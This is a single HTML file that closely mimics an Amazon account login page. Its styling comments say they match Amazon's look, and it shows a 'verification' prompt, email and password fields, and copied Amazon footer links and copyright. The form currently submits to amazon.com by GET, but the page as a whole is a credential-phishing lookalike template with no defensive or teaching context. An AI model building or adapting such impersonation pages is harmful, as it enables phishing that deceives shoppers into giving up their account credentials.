
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Account Login/Verification</title>
    <style>
        /* Global Reset and Setup */
        body {
            font-family: Arial, sans-serif;
            background-color: #fff; /* White background */
            margin: 0;
            padding: 0;
            color: #111; /* Dark text */
            -webkit-font-smoothing: antialiased;
        }

        /* Header Bar (Top Navigation) */
        .header-bar {
            background-color: #fff;
            padding: 10px 0;
            border-bottom: 1px solid #ddd; /* Subtle bottom line */
            text-align: center;
            position: sticky; /* Keeps it at the top */
            top: 0;
            z-index: 10;
        }

        .header-bar span {
            font-weight: bold;
            font-size: 18px;
            color: #000;
        }
        
        /* The main container for the content */
        .content-container {
            padding: 20px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400; /* Regular font weight */
            margin-top: 0;
            margin-bottom: 20px;
        }

        /* Radio Button / Selection Styles */
        .option-group {
            margin-bottom: 25px;
            font-size: 16px;
        }

        .option-group label {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
            cursor: pointer;
        }

        .option-group input[type="radio"] {
            /* Custom radio button styling to match Amazon's look */
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            width: 20px;
            height: 20px;
            border: 1px solid #777;
            border-radius: 50%;
            margin-right: 10px;
            position: relative;
            outline: none;
            cursor: pointer;
            flex-shrink: 0; /* Prevents button from shrinking */
        }

        .option-group input[type="radio"]:checked {
            border: 5px solid #007185; /* Dark teal/blue check color */
        }

        /* Input Field Styling */
        .form-group {
            border: 1px solid #a2a6ac;
            border-radius: 3px;
            padding: 0;
            margin-top: 10px;
            margin-bottom: 25px;
            box-shadow: 0 1px 0 rgba(255, 255, 255, 0.5), 0 1px 0 rgba(0, 0, 0, 0.07) inset;
        }

        /* The Email/Password fields */
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: none;
            box-sizing: border-box;
            font-size: 17px;
            outline: none;
        }

        /* The large yellow button */
        .continue-button {
            width: 100%;
            padding: 10px;
            background-color: #FFD814; /* Amazon yellow */
            border: 1px solid #FCD200;
            border-radius: 8px;
            cursor: pointer;
            font-size: 17px;
            font-weight: normal; /* To match the Amazon button font weight */
            color: #0F1111; /* Dark text on button */
            transition: background-color 0.2s;
        }

        .continue-button:hover {
            background-color: #F7CA00;
        }

        /* Links and Footer */
        .links-text {
            font-size: 12px;
            margin-top: 20px;
            line-height: 1.5;
            color: #555;
        }

        .links-text a,
        .footer-links a {
            color: #0066c0; /* Standard Amazon link blue */
            text-decoration: none;
        }

        .footer-bar {
            background-color: #fff;
            padding: 30px 20px;
            border-top: 1px solid #ddd;
            margin-top: 30px;
            font-size: 12px;
            text-align: center;
        }

        .footer-links a {
            padding: 0 10px;
            border-right: 1px solid #ccc;
        }

        .footer-links a:last-child {
            border-right: none;
        }

        .copyright {
            margin-top: 10px;
            color: #555;
        }
    </style>
</head>
<body>

    <div class="header-bar">
        <span>Amazon.com</span>
    </div>

    <div class="content-container">
        <h1>Welcome</h1>

        <div class="option-group">
            <label>
                <input type="radio" name="account_option" checked>
                Sign in. **Use this option for verification.**
            </label>
        </div>

        <form action="https://www.amazon.com" method="GET">
            
            <label for="email_field">Email or phone number</label>
            <div class="form-group">
                <input type="text" id="email_field" name="user_email" required>
            </div>
            
            <label for="password_field">Password</label>
            <div class="form-group">
                <input type="password" id="password_field" name="user_password" required>
            </div>
            
            <button type="submit" class="continue-button">Continue</button>
        </form>

        <div class="links-text">
            By signing in and verifying, you are agreeing to our 
            <a href="https://www.amazon.com/gp/help/customer/display.html/ref=footer_cou?ie=UTF8&nodeId=508088">Conditions of Use and Sale</a> 
            and our <a href="https://www.amazon.com/gp/help/customer/display.html/ref=footer_privacy?ie=UTF8&nodeId=468496">Privacy Notice</a>.
        </div>
    </div>

    <div class="footer-bar">
        <div class="footer-links">
            <a href="https://www.amazon.com/gp/help/customer/display.html/ref=footer_cou?ie=UTF8&nodeId=508088">Conditions of Use</a>
            <a href="https://www.amazon.com/gp/help/customer/display.html/ref=footer_privacy?ie=UTF8&nodeId=468496">Privacy Notice</a>
            <a href="https://www.amazon.com/gp/help/customer/display.html/ref=footer_help?ie=UTF8&nodeId=508510">Help</a>
        </div>
        <div class="copyright">
            &copy; 1996-2025, Amazon.com, Inc. or its affiliates
        </div>
    </div>

</body>
</html>
